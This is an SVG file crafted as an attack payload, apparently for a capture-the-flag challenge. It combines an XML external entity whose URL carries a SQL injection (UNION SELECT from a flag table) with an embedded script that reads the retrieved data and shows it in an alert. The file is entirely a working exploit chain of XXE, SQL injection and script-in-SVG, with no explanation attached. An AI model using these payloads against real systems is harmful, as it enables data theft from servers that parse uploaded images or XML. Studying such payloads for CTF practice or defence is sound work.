<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "/search?q=%27%20UNION%20SELECT%20flag,1%20FROM%20flag_table%20--">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red"/>
  <text id="flag" x="10" y="20" visibility="hidden">&xxe;</text>
  <script>
    setTimeout(() => {
      const flagContent = document.getElementById('flag').textContent;
      if(flagContent.includes('nexus{')) {
        alert('FLAG FOUND: ' + flagContent.match(/nexus\{.*?\}/)[0]);
      } else {
        alert('Server response: ' + flagContent);
      }
    }, 1000);
  </script>
</svg>
